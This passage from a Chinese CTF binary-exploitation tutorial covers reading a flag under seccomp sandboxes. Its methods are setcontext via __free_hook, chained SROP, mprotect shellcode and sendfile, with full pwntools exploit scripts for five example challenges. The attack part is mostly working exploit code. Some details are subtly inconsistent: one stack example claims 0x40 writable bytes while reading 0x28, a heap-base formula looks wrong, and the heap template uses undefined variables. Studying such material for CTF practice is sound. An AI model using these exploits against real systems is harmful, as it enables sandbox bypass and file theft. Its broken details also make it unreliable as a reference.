| 偏移 | 恢复的寄存器 | ORW 里的用途 |
| ---- | ------------ | ------------ |
| +0x68 | rdi | 第一个参数（fd 或 stdout） |
| +0x70 | rsi | 第二个参数（buf / path） |
| +0x88 | rdx | 第三个参数（count） |
| +0xa0 | rsp | 指向堆上的 orw ROP 链 |
| +0xa8 | rip | 链的第一条 gadget（push 后被 ret 弹出） |

> 版本差异：**libc 2.29 起**寄存器基地址从 rdi 换成了 rdx（gadget 变成 `setcontext+61`，`mov rsp, [rdx+0xa0]`），触发时要把 fake ucontext 地址放进 rdx 而不是 rdi（堆题里通常靠 `getcontext` 附近的 gadget 或改用别的 hook 触发点配合）。打 2.31/2.34 系统时留意。

### 11.5.2 在堆题里怎么触发

堆题的常用触发链：

```
tcache/fastbin 投毒 ──> 往 __free_hook 写入 setcontext+53
                                  │
free(chunk) ── __free_hook(p, ...)：rdi 恰好 = chunk 用户区指针
                                  │
                     setcontext+53 把 chunk 内容当 ucontext 恢复
                                  │
             rsp -> 堆上 ROP 链，rip -> 链首 gadget，orw 开始
```

三个细节：

1. **为什么用 free 触发**：`__free_hook` 被调用时第一个参数 rdi 就是"被 free 的 chunk 用户区地址"——天然指向我们伪造的数据，一个对齐都不用调。
2. **没有栈地址也能打**：rsp 直接填**堆地址**（把 ROP 链写在另一个 chunk 里），完全绕开"泄露栈"的需求。要泄露栈也简单：libc 的 `environ` 符号里存着一个栈地址，show 出来即可。
3. **chunk 要够大**：fake ucontext 用到 +0xa8，chunk 用户区至少 0xb0+，一般开 0x100。

### 11.5.3 配合 mprotect 写 shellcode（另一条分支）

setcontext 也可以不走"堆上 ROP"，改成"改权限 + 落 shellcode"：

```
fake ucontext:  rdi=heap_page, rsi=0x1000, rdx=7, rip=mprotect, rsp=第二段链
                                        │
                       mprotect(heap, 0x1000, RWX) 执行完 ret
                                        │  ret 弹出 rsp 指向的第二段链
                       第二段链: read(0, heap_page, 0x200) 读入 shellcode
                                        │
                       ret 到 heap_page，执行 orw shellcode
```

适用于：libc gadget 不全（找不到 pop rdx 等）、或想复用现成 shellcode 的场合。两条分支本质都是"setcontext 给你一个任意寄存器起点"。

### 11.5.4 完整堆题 orw exp 模板（2.27 风格）

接口假定为：`add(size, data)` / `edit(idx, data)` / `free(idx)` / `show(idx)`，存在 UAF（double free 可用），完整例题见 11.9 例题二。

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('./libc-2.27.so', checksec=False)
io   = process('./pwn')

def add(size, data=b'A'):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'size:', str(size).encode())
    io.sendafter(b'data:', data)

def free(idx):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'idx:', str(idx).encode())

# ---- 1. 泄露 libc：双 free 制造 unsorted bin 残留，show 读 main_arena+96 ----
add(0x88); add(0x68)          # 隔开 top chunk
free(0)
show(0)
main_arena96 = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = main_arena96 - 0x3ebca0          # 2.27 的 main_arena+96 偏移，按 libc 实测改
log.success('libc base: ' + hex(libc.address))

# ---- 2. 泄露堆地址：tcache double free 后 fd 是裸堆指针（2.27 无打乱）----
add(0x68)                     # idx=1，unsorted 切块/复用均可，重新拿两个 tcache chunk
add(0x68)                     # idx=2
free(1); free(1)              # tcache double free（2.27 无 key 检查）
show(1)
heap_leak = u64(io.recv(6).ljust(8, b'\x00'))
heap_base  = (heap_leak << 12) - 0x1000        # tcache 里指向自身,低 12 位为 0，右移还原
log.success('heap base: ' + hex(heap_base))

# ---- 3. tcache 投毒：把下一个 chunk 申请到 __free_hook ----
free(2)
add(0x68, p64(libc.sym['__free_hook']))   # 污染 tcache fd（此时 idx 复用,按实际编号调）
add(0x68)                                  # 取出被污染的
add(0x68, p64(libc.sym['setcontext'] + 53))  # __free_hook = setcontext+53

# ---- 4. 造 fake ucontext + 堆上 ROP 链 ----
# libc 里收集 gadget
rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]   # 找不到就换 'pop rdx; pop rbx; ret' 等组合
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]

# 文件名与 buf 放另一个 chunk（heap 上可读可写）
path_chunk = heap_base + 0x1000        # 按实际堆布局换地址
buf_addr   = path_chunk + 0x100

# ROP 链写在 chunk C 的数据区
chain  = flat(POP_RDI, path_chunk, POP_RSI, 0, POP_RDX, 0, POP_RAX, 2, SYSCALL)  # open
chain += flat(POP_RDI, 3, POP_RSI, buf_addr, POP_RDX, 0x100, POP_RAX, 0, SYSCALL) # read
chain += flat(POP_RDI, 1, POP_RSI, buf_addr, POP_RDX, 0x100, POP_RAX, 1, SYSCALL) # write

# chunk B：fake ucontext（rsp 指向链首第二条的位置，rip=链首第一条）
add(0x100)  # 假定 idx=3，是即将被 free 的 chunk
add(0x100, b'/flag\x00'.ljust(0x100, b'\x00'))   # idx=4：存文件名的 chunk（地址=path_chunk 时对应它）

fake = flat({
    0x68: 0,                          # rdi（open 的 path 由链里 pop rdi 提供，这里随意）
    0x70: 0,                          # rsi
    0x88: 0,                          # rdx
    0xa0: chain_addr + 8,             # rsp -> ROP 链（跳过链首第一条 gadget 的位置）
    0xa8: chain_first_gadget,         # rip -> 链首第一条 gadget（pop rdi; ret）
}, filler=b'\x00')
add(0x100, fake)                       # idx=5：fake ucontext 所在 chunk

# ---- 5. free 触发：__free_hook -> setcontext+53，rdi = fake chunk ----
free(5)
print(io.recvall(timeout=2))           # flag 出来了
```

模板里 `chain_addr / chain_first_gadget / path_chunk` 请按本题堆布局实际计算（核心是：**fake chunk 的 +0xa0/+0xa8 分别填"链的剩余部分地址"和"链第一条 gadget 地址"**）。

---

## 11.6 SROP + ORW

### 11.6.1 SigreturnFrame 原理

`rt_sigreturn`（64 位调用号 15）是信号返回系统调用：内核把整个用户态寄存器现场从**用户栈上的 sigframe** 恢复——包括 rax/rdi/rsi/rdx/rsp/rip 全家桶。攻击者只要能"发起一次 sigreturn + 把伪造的 frame 摆好"，就等于获得了一次任意寄存器赋值（与 setcontext 异曲同工，但 frame 是 pwntools 标准件，248 字节）。

利用前提：

1. 一个能让 `rax=15` 再 `syscall` 的组合：`pop rax; ret`（15）+ `syscall; ret`，或现成的 `mov rax, 15; syscall` gadget；
2. gadget 地址已知（静态题直接有；动态题先泄露 libc）；
3. 溢出长度 ≥ 8 + 248 字节（放"触发三件套 + 一个 frame"）。

单个 frame 只能执行**一次** syscall，所以 orw 需要 frame 串联（见 11.6.2）。

```python
frame = SigreturnFrame(kernel='amd64')     # i386 用 kernel='i386'，112 字节，sigreturn=119
frame.rax = constants.SYS_open             # 2
frame.rdi = flag_path_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL                        # sigreturn 返回后从这里开始执行
frame.rsp = next_step_addr                 # syscall;ret 的 ret 从这里弹下一条
```

### 11.6.2 frame 串联：三连 SROP 跑完 orw

核心技巧：**用 frame 里的 rsp 把"下一发 SROP 的触发三件套 + frame"串起来**。frame 执行完它的 syscall 后，`syscall; ret` 的 ret 会弹出 `frame.rsp` 指向的数据——只要那里提前摆好 `pop rax; 15; syscall; frame_next`，就无缝进入下一发。

```
栈（第一发 payload，直接溢出写入）：
低地址
+----------------+
| pop rax ; ret  |
| 15             |      rax = 15 (rt_sigreturn)
| syscall ; ret  |  <── 触发 sigreturn
| frame1 (248B)  |      frame1: rax=0, rdi=0, rsi=BSS, rdx=0x400
+----------------+      rip=SYSCALL => 执行 read(0, BSS, 0x400) 阻塞
                        rsp=BSS   => read 返回后 ret 弹出 BSS 处数据
高地址

第二段（通过上面那次 read 发到 BSS）：
低地址
BSS+0x000: pop rax;ret | 15 | syscall;ret | frame2(248B)   frame2: open(BSS+0x300,0,0)
BSS+0x110: pop rax;ret | 15 | syscall;ret | frame3(248B)   frame3: read(3, BSS+0x400, 0x100)
BSS+0x220: pop rax;ret | 15 | syscall;ret | frame4(248B)   frame4: write(1, BSS+0x400, 0x100)
BSS+0x330: pop rax;ret | 60 | syscall;ret | 0              收尾 exit(60)
BSS+0x390: "/flag\0"
BSS+0x400: read 缓冲区
高地址
```

每一发的 `frame.rsp` 依次指向下一组三件套的起始（BSS+0x110、BSS+0x220、BSS+0x330），像链表一样串下去。

### 11.6.3 完整模板

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./pwn', checksec=False)      # 假定无 PIE，静态/动态均可（动态先泄露 libc）
io  = process('./pwn')

POP_RAX = 0x4016f6                      # pop rax ; ret    （ROPgadget 实测替换）
SYSCALL = 0x401705                      # syscall ; ret
BSS     = elf.bss(0x600)

def srop_frame(**kw):
    f = SigreturnFrame(kernel='amd64')
    for k, v in kw.items():
        setattr(f, k, v)
    return f

trigger = p64(POP_RAX) + p64(15) + p64(SYSCALL)   # pop rax=15; syscall => sigreturn

# frame1: read(0, BSS, 0x400) —— 把第二段读进 bss
f1 = srop_frame(rax=0, rdi=0, rsi=BSS, rdx=0x400,
                rsp=BSS, rip=SYSCALL)

io.sendafter(b'>> ', b'A' * 0x28 + trigger + bytes(f1))

# frame2: open("/flag") ；frame3: read(3, ...) ；frame4: write(1, ...)
f2 = srop_frame(rax=constants.SYS_open, rdi=BSS + 0x390, rsi=0, rdx=0,
                rsp=BSS + 0x110, rip=SYSCALL)
f3 = srop_frame(rax=0, rdi=3, rsi=BSS + 0x400, rdx=0x100,
                rsp=BSS + 0x220, rip=SYSCALL)
f4 = srop_frame(rax=1, rdi=1, rsi=BSS + 0x400, rdx=0x100,
                rsp=BSS + 0x330, rip=SYSCALL)

stage2  = trigger + bytes(f2)
stage2 += trigger + bytes(f3)
stage2 += trigger + bytes(f4)
stage2 += p64(POP_RAX) + p64(60) + p64(SYSCALL) + p64(0)     # exit(60) 收尾
stage2  = stage2.ljust(0x390 - 0, b'\x00') + b'/flag\x00'    # 文件名落在 BSS+0x390

io.send(stage2)                                              # 喂给 frame1 的 read
print(io.recvall(timeout=2))
```

**两连 SROP 省事版**：open 之后接 sendfile，把 read+write 两发合成一发：

```python
f2 = srop_frame(rax=constants.SYS_open,  rdi=path_addr, rsi=0, rdx=0, rsp=..., rip=SYSCALL)
f3 = srop_frame(rax=40,                  rdi=1, rsi=3, rdx=0, r10=0x1000, rsp=..., rip=SYSCALL)
# 注意 SigreturnFrame 同样可以设 r10
```

> SROP 版与 setcontext 版互补：SROP 需要"pop rax=15"的触发条件（常见于栈题/静态题），setcontext 需要"rdi 指向可控内存"（常见于堆题）。谁的触发条件先满足用谁。

---

## 11.7 其他 syscall 方案

### 11.7.1 mmap / mprotect + shellcode 落位

沙箱白名单里常有 mmap(9)/mprotect(10)（题目自己可能要用），这就送了一条"造 RWX 页"的路：

```
ROP: mprotect(bss, 0x1000, 7) ──> read(0, bss, 0x200) 读 shellcode ──> ret 到 bss
```

```python
rop = ROP(elf)
rop.call(elf.plt['mprotect'] if 'mprotect' in elf.plt else libc.sym['mprotect'],
         [BSS & ~0xfff, 0x1000, 7])
rop.call(elf.plt['read'], [0, BSS, 0x200])
rop.raw(BSS)                     # read 返回后 ret 到 shellcode
io.send(payload + rop.chain())
io.send(orw_shellcode)           # 11.3 的 shellcode
```

栈空间够的话也可以直接 mprotect 栈页再跳栈上 shellcode。注意页对齐（地址 & ~0xfff）。

### 11.7.2 sendfile / writev 替代 write

| 场景 | 替代调用 | 说明 |
| ---- | -------- | ---- |
| write(1) 被禁 | sendfile(40) | `sendfile(1, fd, 0, n)` 内核直拷，根本不经过 write |
| write(1) 被禁 | writev(20) | `writev(1, iov, 2)`，iov 数组在 bss 构造 `[buf, len]` 两连块 |
| 想省寄存器 | sendfile(40) | 比 read+write 少一半寄存器设置（r10 可以不设，见下） |

> 重要澄清：**换成 libc 的 `fwrite`/`puts` 没有用**——它们底层还是 write(1) 系统调用，照样被 seccomp 杀。seccomp 拦在内核，用户态换皮无效，必须换**系统调用号**。

### 11.7.3 open + sendfile 一条龙

```
open("/flag", 0)      => fd=3 (rax)
sendfile(1, 3, 0, n)  => rdi=1, rsi=3, rdx=0, r10=?
```

亮点：`r10`（count）**几乎不用管**——它是垃圾值也没事，只要大于文件长度就能全送出来；实在要设，找 `pop r10; ret` 或用 libc 的 `sendfile` 函数（参数表 rdi/rsi/rdx/rcx，注意函数版第 4 参是 rcx 不是 r10）。所以整条链只需要 rdi/rsi/rdx 三个最常见 gadget：

```python
rop.call(libc.sym['open'],     [path_addr, 0])
rop.call(libc.sym['sendfile'], [1, 3, 0, 0x100])
```

shellcode 版见 11.3.3。这是"最短 ORW"惯用套路，尤其受 SROP（两连 frame 即可完成）与堆题欢迎。

### 11.7.4 fopen / fread / fwrite@plt 组合（不碰裸 syscall）

适用场景：二进制 import 了 `fopen/fread/fwrite/puts`（比如程序本来就有"读文件展示"功能），但主程序与已泄露的 libc 里不好凑齐 orw 的裸 gadget，或者干脆想让 exp 更"libc 味"。

要点与难点：

1. `fopen(path, mode)` 底层执行 open/openat 系统调用——**沙箱若允许 open/openat，fopen 就能用**；返回 `FILE*` 在 rax，**但底层 fd 依然是最小空闲 fd（一般 3）**。
2. `fread(buf, size, nmemb, stream)` 的第 4 参 `stream` 是 64 位下的 rcx——`pop rcx; ret` 少见，而 FILE* 又是 fopen 的运行时返回值（动态值没法提前写进栈），这是本路线最大的坑。
3. 破局三板斧：
   - **fd 借道**：fopen 之后直接用 `sendfile(1, 3, 0, n)` / `read(3, buf, n)` 操作底层 fd，绕开 FILE*（最推荐）；
   - **搬运 gadget**：找 `mov rdx, rax; ret` 配 fgets（stream 是第 3 参）或 `mov rcx, rax; ret` 配 fread；
   - **泄露 FILE***：fopen 后把 rax 经写内存 gadget 存进 bss 再读出（繁琐，不常用）。
4. `fwrite(buf, size, nmemb, stream)` 同样受 rcx 问题困扰；`fputs(buf, stream)` 只有 2 参（rdi/rsi），配 `mov rsi, rax` 类 gadget 可用。

fopen + sendfile 完整思路的实战例题见 11.9 例题五。

---

## 11.8 沙箱变种应对表

| 沙箱特征（seccomp-tools dump 看到的） | 难点 | 应对方案 |
| ------------------------------------ | ---- | -------- |
| 黑名单只禁 execve(59)/execveat(322) | 无 | 标准 orw：ROP/shellcode/SROP/setcontext 任选 |
| 白名单只放 open/read/write/close/exit(/exit_group) | 无 openat、无 getdents | 裸 syscall 用 2 号 open（不能用 glibc open 函数）；路径靠猜/题面 |
| 白名单含 openat 不含 open | 调用号不同 | openat(-100=AT_FDCWD, path, 0, 0)，shellcode 里 `mov edi, 0xffffff9c` 附近配 mov/扩展 |
| 禁 open 但允许 openat | | 同上，全是 openat 参数（多一个 r10=mode） |
| 禁 write(1) | 输出通道没了 | sendfile(40)/writev(20)；pwrite64 写到 stdout 的 fd 也可以（若未被禁） |
| 禁 read(0) 但允许 read 文件 read(fd>2)？读 flag 用的是 read | 少见 | 若 read 整个被禁：用 pread64(17)、mmap 文件到内存(9)、sendfile 到 stdout |
| prctl 只允许 open/read/write/close/exit | 经典 | 就是标准 orw 白名单，注意有没有 openat |
| 程序内 alarm(30/60) 限时 | 脚本慢就超时 | 提前组好 payload 一次性发；用 sendfile 减少往返；关 pwntools 调试输出 |
| chroot 限制在某个目录 | 看不到根目录 | 相对路径逐层 open(".") + getdents64 枚举；/proc 若未挂载就别指望 |
| 禁 execve 但 RET_ERRNO(软失败) | 容易误判没沙箱 | dump 看 K 值；orw 照打，只是别再用 execve 试探浪费时间 |
| 白名单允许 mprotect/mmap | 送分 | 造 RWX 页落 shellcode（11.7.1） |
| 白名单允许 sigreturn(15) 且能凑 pop rax | | SROP 全家桶（11.6） |

---

## 11.9 典型例题

### 例题一：栈题 ORW ROP（禁 execve 的静态题）

**伪 C：**

```c
// 编译：gcc pwn.c -o pwn -static -no-pie
void install_seccomp();              // 白名单: open/read/write/close/exit/exit_group
int vuln() {
    char buf[0x20];
    puts(">> ");
    read(0, buf, 0x100);             // 溢出 0x100，距返回地址 0x28
    return 0;
}
int main() { install_seccomp(); setvbuf(stdout, 0, 2, 0); vuln(); }
```

**checksec：**

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
STATIC:   statically linked          ← gadget 管够
```

**seccomp-tools dump：**（同 11.1.3 例 B 白名单：read/write/open/exit/exit_group）

**exp：**（即 11.4.1 模板原样可用；此处给出按例题参数的最终版）

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./pwn', checksec=False)
io  = process('./pwn')                # remote('ip', port)

rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
BSS = elf.bss(0x800)

chain  = flat(POP_RDI, BSS, POP_RSI, 0, POP_RDX, 0, POP_RAX, 2, SYSCALL)            # open("/flag",0,0)
chain += flat(POP_RDI, 3, POP_RSI, BSS + 0x100, POP_RDX, 0x100, POP_RAX, 0, SYSCALL) # read(3,...)
chain += flat(POP_RDI, 1, POP_RSI, BSS + 0x100, POP_RDX, 0x100, POP_RAX, 1, SYSCALL) # write(1,...)

# 文件名直接放 bss：静态二进制里没有现成 "/flag" 字符串时，
# 用 read 先写进去（此处假设 bss 里已有可写区域，第一次交互写入）
rop0 = ROP(elf)
rop0.raw(POP_RDI); rop0.raw(0)
rop0.raw(POP_RSI); rop0.raw(BSS)
rop0.raw(POP_RDX); rop0.raw(8)
rop0.raw(POP_RAX); rop0.raw(0)
rop0.raw(SYSCALL)
rop0.raw(chain)

io.sendlineafter(b'>> ', b'A' * 0x28 + rop0.chain())
io.send(b'/flag\x00')                 # 第 0 步 read(0, BSS, 8) 的内容
print(io.recvall(timeout=2))
```

要点：白名单里**没有 openat**，所以必须用裸 syscall 走 2 号 open；fd 假定 3，失败就把 3 换 4/5 试。

### 例题二：堆题 setcontext + ORW（2.27 风格）

**伪 C：**

```c
// glibc 2.27, Ubuntu 18.04
void add(size_t sz);                 // malloc，读 data（堆溢出/无溢出按题）
void free(int idx);                  // 无置空指针 => UAF/double free
void show(int idx);                  // 打印 chunk 内容 => 泄露
void edit(int idx, char *d);         // UAF 写
int main() {
    install_seccomp();               // 白名单: open/read/write/close/exit
    menu_loop();                     // add/free/show/edit
}
```

**checksec：** Arch amd64，Full RELRO，NX，No PIE（libc 2.27 常见组合）。

**seccomp-tools dump：** 白名单 open/read/write/close/exit/exit_group（同例 B）。

**exp：** 11.5.4 的完整模板即为本题解。核心三步复述：

1. unsorted bin 泄露 libc；tcache double free 泄露堆；
2. tcache 投毒把 chunk 申请到 `__free_hook`，写入 `setcontext+53`；
3. 在 chunk 数据区摆 fake ucontext（+0xa0=rsp 指堆上 orw 链，+0xa8=rip=链首 gadget），`free` 它触发——rdi 天然指向 chunk，setcontext 一口气换栈改 rip，堆上 ROP 链跑 orw。

若远程是 2.29+：gadget 换 `setcontext+61`（rdx 基址），触发点改走 `__malloc_hook` + `malloc(size)` 里 rdx 恰为可控值的组合，或改用 `environ` 泄露栈地址后走栈 ROP。

### 例题三：shellcode ORW 题（NX off）

**伪 C：**

```c
char code[0x200];                    // 全局可写区
void vuln() {
    read(0, code, 0x200);            // 先读 shellcode 到固定地址 bss
    char buf[0x20];
    read(0, buf, 0x100);             // 溢出点，距返回地址 0x28
}
// gcc -z execstack -no-pie          栈/bss 可执行(本题直接跳 bss)
```

**checksec：**

```
Arch:    amd64-64-little
NX:      NX disabled                 ← 关键
PIE:     No PIE (0x400000)
```

**seccomp-tools dump：** 黑名单仅 execve（同 11.1.3 例 A）。

**exp：**

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
elf = ELF('./pwn', checksec=False)
io  = process('./pwn')

sc  = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
sc += shellcraft.exit(0)

io.sendafter(b'code:', asm(sc).ljust(0x200, b'\x90'))     # 第一段：shellcode 进 bss
io.sendafter(b'buf:', b'A' * 0x28 + p64(elf.symbols['code']))  # 第二段：ret 到 bss 执行
print(io.recvall(timeout=2))
```

要点：黑名单只禁 execve，shellcode 想怎么写怎么写；fd 用 rax 现取，路径想多长都行（push 分段）。

### 例题四：分段 ROP ORW（链放不下）

**伪 C：**

```c
// 静态链接 -no-pie；seccomp 黑名单仅禁 execve
void vuln() {
    char buf[0x10];
    read(0, buf, 0x28);              // 只能写 0x40 字节：返回地址 + 8 个槽位，链放不下！
}
```

**checksec：** amd64，NX enabled，No PIE，静态。**seccomp-tools dump：** 黑名单仅 execve。

**思路**：每轮 8 个槽位做完"一段"就返回 vuln 重新溢出。技巧：open 用裸 syscall（要 rax），read/write 用**静态二进制里的 libc 函数**（省掉 pop rax 的两个槽位）：

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./pwn', checksec=False)
io  = process('./pwn')

rop  = ROP(elf)
G = {n: rop.find_gadget([n, 'ret'])[0] for n in ('pop rdi', 'pop rsi', 'pop rdx', 'pop rax')}
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
READ  = elf.symbols['read']           # 静态二进制里 libc 的 read 函数地址
WRITE = elf.symbols['write']
BSS   = elf.bss(0x800)
VULN  = elf.symbols['vuln']           # 每轮做完回到 vuln 重新溢出

# 第 1 轮：gets(bss) 写文件名（4 槽，rdx 是垃圾无所谓）
chain = flat(G['pop rdi'], BSS, elf.symbols['gets'], VULN)
io.send(b'A' * 0x10 + chain)
io.sendline(b'/flag')                 # gets 读到换行为止

# 第 2 轮：open(BSS, 0, 0) —— 8 槽正好（syscall;ret 的 ret 弹 VULN 重新进入）
chain = flat(G['pop rdi'], BSS, G['pop rsi'], 0, G['pop rax'], 2, SYSCALL, VULN)
io.send(b'A' * 0x10 + chain)

# 第 3 轮：read(3, BSS+0x100, 0x100) —— 调函数版，不需要 rax
chain = flat(G['pop rdi'], 3, G['pop rsi'], BSS + 0x100, G['pop rdx'], 0x100, READ, VULN)
io.send(b'A' * 0x10 + chain)

# 第 4 轮：write(1, BSS+0x100, 0x100)
chain = flat(G['pop rdi'], 1, G['pop rsi'], BSS + 0x100, G['pop rdx'], 0x100, WRITE, VULN)
io.send(b'A' * 0x10 + chain)

print(io.recvall(timeout=2))
```

要点：①分段的关键是**每轮链尾都填 vuln 入口**，`syscall;ret`/函数调用的 ret 正好弹出它；②寄存器跨轮会丢，所以每轮自带全部参数；③read/write 改调函数可省 rax 槽位——空间紧张的救命数。

### 例题五：fopen / sendfile 版 ORW（不碰裸 syscall gadget）

**伪 C：**

```c
// 动态链接 -no-pie；PLT 里有 fopen/gets/sendfile/puts（题目自带"读文件并传输"功能）
void vuln() {
    char buf[0x40];
    read(0, buf, 0x200);             // 溢出够长
}
// seccomp：黑名单禁 execve（open/openat/read/write/sendfile 全放行）
```

**checksec：** amd64，Partial RELRO，NX，No PIE。**seccomp-tools dump：** 黑名单仅 execve（例 A）。

**exp**（fopen 打开 → 底层 fd=3 → sendfile(1,3) 直接输出，全程不碰 FILE* 动态值）：

```python
from pwn import *
context.arch = 'amd64'
elf  = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io   = process('./pwn')

# 1. 泄露 libc（puts@got 老套路，见第 05 章）
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]
main    = elf.symbols['main']
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.raw(main)
io.sendlineafter(b'>> ', b'A' * 0x48 + rop.chain())
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']
log.success(hex(libc.address))

# 2. 第二发：gets 写 "/flag" 和 "r"，fopen 打开(fd=3)，sendfile 直接送 stdout
rop = ROP(libc)
rop.call(elf.plt['gets'], [elf.bss(0x500)])            # "/flag"
rop.call(elf.plt['gets'], [elf.bss(0x520)])            # "r"
rop.call(elf.plt['fopen'], [elf.bss(0x500), elf.bss(0x520)])   # fopen("/flag","r") -> fd=3
rop.call(libc.sym['sendfile'], [1, 3, 0, 0x100])       # sendfile(1, 3, NULL, 0x100)
rop.call(libc.sym['exit'], [0])

io.sendlineafter(b'>> ', b'A' * 0x48 + rop.chain())    # 主 payload（偏移按题目调）
io.sendline(b'/flag')                                  # 喂第一个 gets
io.sendline(b'r')                                      # 喂第二个 gets
print(io.recvall(timeout=2))
```

要点：①`r10`（count）没设也不怕——只要垃圾值 ≥ 文件长度就能全送出来，这是 sendfile 的隐藏福利；②全程没碰 `pop rax`/`syscall` gadget，动态链接也能打；③若要正经 fread(buf,1,n,FILE*)，就得处理 rcx=FILE* 的问题（11.7.4 的三板斧）。

---

## 11.10 常见坑

1. **open 的返回值丢了**：open 返回 fd 在 rax，后续任何 `syscall`/函数调用都会改 rax。shellcode 里第一时间 `mov rdi, rax`；ROP 里要么紧跟使用、要么写死 3 并祈祷标准流齐全。翻车特征：read/write 返回 -EBADF，什么都没打出来。
2. **flag 路径写死 `/flag`**：远程可能是 `./flag`、`/home/ctf/flag`、`/flag.txt`、`flag_随机串`。对策：getdents64 列目录（白名单允许时）、写个循环对候选路径逐个试、或者看题目描述猜部署习惯。
3. **read 长度小于文件实际长度**：`read(3, buf, 0x20)` 只读了 flag 的前 32 字节就 write，输出截断。对策：长度给大（0x100/0x1000）；或用动态返回值；或 sendfile 给大 count。
4. **64 位 open 的 openat 陷阱**：glibc 的 `open()` 函数底层走 **openat(257)**。白名单只放行 2 号 open 时，`rop.call(libc.sym['open'], ...)` 和 `fopen` 会直接失败，必须用裸 `syscall` + rax=2。反过来只放 openat 时就得 `openat(AT_FDCWD=-100, ...)`。做题前把白名单抄下来对照。
5. **shellcode 含坏字节**：`\x00`（push 方式规避）、`\x0a`（stdin read 截断）、scanf 系 `\x20\x09\x0b\x0c\x0d`。asm 完先检查：`assert b'\n' not in sc`。文件名字符串同理。
6. **fd 假定 3 失败**：程序 close 过标准流或开过别的文件时 fd 前移/后移。特征：本地通远程不通。对策：换 4/5 试，或 shellcode 版用 rax 现取。
7. **write 固定长度混入脏数据**：`write(1, buf, 0x100)` 会把 buf 后面的旧内存一起打出来，recv 解析时注意切分（flag 一般以明文开头，`recvuntil`/正则抠出来）。
8. **setcontext 版本错位**：2.27 用 +53（rdi 基址），2.29+ 用 +61（rdx 基址）；拿错偏移直接段错误。以远程 libc 版本对应的反汇编为准。
9. **SROP 的 frame.rsp 忘了设**：frame 只设 rip 不设 rsp 的话，`syscall;ret` 的 ret 弹的是垃圾——串联必须把 rsp 精确指到下一发三件套。
10. **alarm 超时**：分段 ROP 每轮一次往返，脚本里 sleep/调试输出太多就会超时。提前把 payload 全备好，`context.log_level='error'` 关日志。
11. **本地与远程沙箱不一致**：本地测通了不代表远程规则相同——部署可能加载不同的 so 或参数不同。以远程行为为准复核 dump 结果（有条件的话）。

---

## 11.11 本章检查清单

- [ ] 拿到题先跑 `seccomp-tools dump`，抄下白/黑名单与 K 值（ALLOW/KILL/ERRNO）。
- [ ] 判断类型：黑名单禁 execve → 标准 orw；白名单 → 对照允许集合选方案。
- [ ] 选执行载体：有可执行内存 → shellcode；栈溢出够长 → ROP；堆题 → setcontext；有 pop rax → SROP。
- [ ] 确认 open 用几号：2 号 open 还是 257 号 openat（对照白名单与 libc 函数底层的差异）。
- [ ] 文件名落位：bss 写入 / 栈上 push / 现成字符串；路径不确定先列目录或准备候选列表。
- [ ] fd 确定：假定 3 之前想想标准流状态；shellcode 用 rax 现取最稳。
- [ ] read 长度 ≥ 文件长度；write 输出长度可控。
- [ ] 坏字节检查：`\x00\x0a\x20\x09\x0b\x0c\x0d`。
- [ ] 收尾 exit 或允许崩溃，确保 stdout 已通过系统调用写出。
- [ ] 本地打通后按远程参数（路径、fd、libc 版本、沙箱差异）复核再打。

---

## 相关阅读

- [04-ret2syscall.md](04-ret2syscall.md)：系统调用与寄存器传参的完整基础，ORW ROP 的前置。
- [07-ROP高级技巧.md](07-ROP高级技巧.md)：栈迁移、ret2csu、SROP 的系统讲解（本章 11.6 的展开版）。
- [10-堆漏洞全解.md](10-堆漏洞全解.md)：tcache 投毒、__free_hook、堆地址泄露——setcontext+ORW 的堆侧前置。
- [03-ret2shellcode.md](03-ret2shellcode.md)：shellcode 的注入与执行环境，本章 shellcode 版 ORW 的基础。
- [README.md](README.md)：返回总览导航。
